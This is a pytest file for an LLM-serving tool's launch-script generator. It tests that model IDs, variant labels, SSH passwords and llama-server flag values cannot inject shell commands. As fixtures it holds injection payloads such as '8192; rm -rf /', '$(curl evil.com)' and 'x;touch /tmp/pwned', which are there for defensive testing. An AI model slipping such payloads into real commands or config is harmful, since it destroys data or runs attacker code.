"""Script-injection tests: model_id and variant labels reach generated
artifacts — the start-<model_id>.sh filename, the llama-swap models.cmd
line and the yaml text (ARD t_76f3d1c0 §7 B3).

The vLLM branch gates model_id through the strict allowlist
(vllm_manager._require_safe_id) BEFORE any filename or yaml key is
derived, and swap_manager sanitizes variant labels for filenames.
llama.cpp emit behavior is intentionally untouched (ARD minimal-diff
principle) — these tests pin the vLLM surfaces only.
"""
import re
import types

import yaml

import conftest
import config_loader as cfg
import engine_registry
import rpc_manager
import swap_manager

VENV_BLOCK = {"delivery": "venv", "venv_bin": "~/vllm-env/bin/vllm",
              "docker_image": "vllm/vllm-openai:latest",
              "default_gpu_memory_utilization": 0.9}

# generated script names: start-<id>.sh where <id> is allowlist-safe
_SCRIPT_NAME = re.compile(r"start-[A-Za-z0-9._-]+\.sh\Z")


def _machine(name, ip, **kw):
    m = {"name": name, "ip": ip, "username": "u", "password": "p",
         "os": "linux", "rpc_port": 50052, "gpu": "", "role": "peer",
         "gpu_vendor": "nvidia",
         "detected": {"gpu_names": ["NVIDIA RTX 3090"],
                      "vram_total_gb": 24, "ram_total_gb": 64}}
    m.update(kw)
    return m


def _model(mid="qwen3-8b", servers=None, **kw):
    m = {"model_id": mid, "name": mid, "flags": {},
         "base_path": "/mnt/store/" + mid,
         "servers": servers if servers is not None else ["aibox1"]}
    # DEC-08: launch reads only the native vllm: section; give every model
    # a minimal non-empty one (cpu_offload_gb 0 emits no flag) unless a
    # test overrides it via kw.
    m.setdefault("vllm", {"cpu_offload_gb": 0})
    m.update(kw)
    return m


def _generate(monkeypatch, tmp_path, models, engine_settings):
    by_name = {"aibox1": _machine("aibox1", "127.0.0.1", role="master")}
    monkeypatch.setattr(swap_manager, "cfg", types.SimpleNamespace(
        machines=conftest._FakeMachines(by_name),
        swap_groups=types.SimpleNamespace(all=lambda: []),
        list_models=lambda: list(models),
        # DEC-03: per-machine swap-config override resolution (real
        # validator; fake machines carry no override keys)
        machine_swap_config_override=cfg.machine_swap_config_override))
    # _split_servers resolves machine names through rpc_manager.cfg —
    # fake it too, or peer lookups would hit the real machine list.
    monkeypatch.setattr(rpc_manager, "cfg", types.SimpleNamespace(
        machines=conftest._FakeMachines(by_name)))
    monkeypatch.setattr(engine_registry, "load_settings",
                        lambda *a, **k: dict(engine_settings))
    monkeypatch.setattr(swap_manager, "SWAP_SETTINGS_FILE",
                        str(tmp_path / "swap-settings.yaml"))
    return swap_manager.generate(str(tmp_path / "config.yaml"), "aibox1")


def test_vllm_script_filename_follows_allowlisted_id(monkeypatch, tmp_path):
    plan = _generate(monkeypatch, tmp_path, [_model("qwen3-8b")],
                     {"engine": "vllm", "vllm": VENV_BLOCK})
    assert plan["scripts"] == ["start-qwen3-8b.sh"]
    for fname in plan["scripts"]:
        assert _SCRIPT_NAME.fullmatch(fname)
    emitted = yaml.safe_load(plan["yaml"])["models"]["qwen3-8b"]
    assert emitted["cmd"] == (
        f"/bin/bash {plan['scripts_dir']}/start-qwen3-8b.sh ${{PORT}}")


def test_shell_metachar_id_never_reaches_scripts_or_yaml(monkeypatch,
                                                         tmp_path):
    hostile = "x;touch /tmp/pwned"
    plan = _generate(monkeypatch, tmp_path,
                     [_model(hostile), _model("good-model")],
                     {"engine": "vllm", "vllm": VENV_BLOCK})
    assert plan["models"] == ["good-model"]
    assert plan["scripts"] == ["start-good-model.sh"]
    assert plan["script_mids"] == ["good-model"]
    assert "pwned" not in plan["yaml"]
    for fname in plan["scripts"]:
        assert _SCRIPT_NAME.fullmatch(fname)


def test_dollar_expansion_id_never_reaches_yaml(monkeypatch, tmp_path):
    plan = _generate(monkeypatch, tmp_path, [_model("a${HOME}b")],
                     {"engine": "vllm", "vllm": VENV_BLOCK})
    assert plan["models"] == []
    assert plan["scripts"] == []
    assert "a${HOME}b" in plan["skipped"]
    assert "${HOME}" not in plan["yaml"]


def test_variant_label_sanitized_in_script_filename(monkeypatch, tmp_path):
    model = _model()
    model["variants"] = [{"label": "evil;id"}]
    plan = _generate(monkeypatch, tmp_path, [model],
                     {"engine": "vllm", "vllm": VENV_BLOCK})
    # ";" sanitized to "-" — the label can never inject into a filename
    assert "start-qwen3-8b--evil-id.sh" in plan["scripts"]
    for fname in plan["scripts"]:
        assert _SCRIPT_NAME.fullmatch(fname)
    for entry in plan["entries"]:
        assert _SCRIPT_NAME.fullmatch(f"start-{entry['model_id']}.sh")
    assert "evil;id" not in plan["yaml"]

# ======================================================================
# qe-validation-test branch: secrets-vault / installer regression tests
# (helper names prefixed _qe_ to avoid collision with the vllm-branch helpers above)
# ======================================================================

import shlex
import pytest
import rpc_manager
from rpc_manager import _render_rpc, build_llama_command


def _qe__machine(name, ip, os="linux", password="pass", **kw):
    m = {
        "name": name,
        "ip": ip,
        "username": "u",
        "password": password,
        "os": os,
        "rpc_port": 50052,
        "gpu": "CUDA0",
        "role": "peer",
        "detected": {
            "gpu_names": ["CUDA0 (GPU)"],
            "vram_total_gb": 8,
            "ram_total_gb": 16,
            "cores": 8,
        },
    }
    m.update(kw)
    return m


def _qe__model(mid, flags=None, **kw):
    m = {
        "model_id": mid,
        "flags": flags or {},
        "base_path": "store://llm-models/x.gguf",
        "device_order": "",
        "device_order_policy": "as-selected",
        "expose": {},
    }
    m.update(kw)
    return m


# ---------------------------------------------------------------------------
# _render_rpc: password with shell metacharacters must not break sshpass line
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("bad_password", [
    "p@ss'word",
    'p"ass"word',
    "pass;word",
    "pass$(evil)",
    "pass`whoami`",
    "pass word",  # space
])
def test_render_rpc_password_never_baked_into_script(stub_cfg, bad_password):
    """Secrets are vault-only: no password ( however metachar-heavy ) may
    appear anywhere in the generated script. The script requires $SSH_PASS
    at runtime (scripts/farm-run.sh decrypts the vault and exports it)."""
    master = _qe__machine("aibox1", "10.0.0.98", role="master")
    peer = _qe__machine("aibox2", "10.0.0.11", password=bad_password)
    stub_cfg.update({m["name"]: m for m in (master, peer)})
    model = _qe__model(
        "m",
        device_order="aibox1-CUDA0,aibox2-CUDA0",
    )
    script = _render_rpc(model, master, [peer])

    assert bad_password not in script, (
        "Plaintext password baked into generated script"
    )
    assert "SSH_PASS" in script, "Expected runtime $SSH_PASS resolution in script"
    sshpass_lines = [l for l in script.splitlines() if "sshpass" in l]
    assert sshpass_lines, "Expected at least one sshpass line in generated script"
    for line in sshpass_lines:
        assert '"$SSH_PASS"' in line or "'$SSH_PASS'" in line or "$SSH_PASS" in line


def _single_quote_escape(s):
    """Return the standard single-quote escape form of s: 'a'\''b' for a'b."""
    return s.replace("'", "'\"'\"'")


def _assert_no_naked_metachar(line, password):
    """Assert that none of the shell metacharacters in `password` appear
    in `line` outside of a quoted region. This is a conservative check:
    if the password appears inside single quotes we are safe."""
    dangerous = set(";`$")  # characters that cause command execution if unquoted
    metachars_in_password = [c for c in password if c in dangerous]
    if not metachars_in_password:
        return  # nothing dangerous to check

    # Confirm the password value is enclosed in single quotes somewhere on the line.
    # Acceptable forms: -p 'value' or -p 'val'"'"'ue'
    import re
    # Match: -p followed by optional space, then a single-quoted token
    # We accept any single-quoted span that contains the dangerous char.
    single_quoted_spans = re.findall(r"'[^']*'", line)
    combined = "".join(single_quoted_spans)
    for c in metachars_in_password:
        assert c in combined, (
            f"Metacharacter {c!r} from password appears to be outside single quotes "
            f"on line: {line!r}"
        )


# ---------------------------------------------------------------------------
# build_llama_command: flag values with metacharacters must not inject shell
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("flag_value", [
    "8192; rm -rf /",
    "$(curl evil.com)",
    "`id`",
])
def test_build_llama_command_flag_value_does_not_inject(stub_cfg, flag_value):
    """A flag value containing shell metacharacters must be quoted or
    escaped in the emitted llama-server command line, so the shell cannot
    execute the embedded payload."""
    master = _qe__machine("aibox1", "10.0.0.98", role="master")
    stub_cfg.update({master["name"]: master})
    model = _qe__model("m", flags={"ctx-size": flag_value})
    cmd = build_llama_command(model, [master["name"]], master_name=master["name"])

    # The raw injection suffix must not appear unquoted.
    # Specifically the '; rm -rf /' or backtick/dollar expansions.
    dangerous_tokens = ["rm -rf", "$(curl", "`id`"]
    for tok in dangerous_tokens:
        if tok in flag_value:
            # If present, it must be inside quotes on the same token
            # A simple heuristic: the token must be preceded by a quote char
            idx = cmd.find(tok)
            if idx != -1:
                preceding = cmd[max(0, idx - 20):idx]
                assert "'" in preceding or '"' in preceding, (
                    f"Dangerous token {tok!r} appears unquoted in command: "
                    f"...{cmd[max(0,idx-20):idx+len(tok)+5]!r}..."
                )
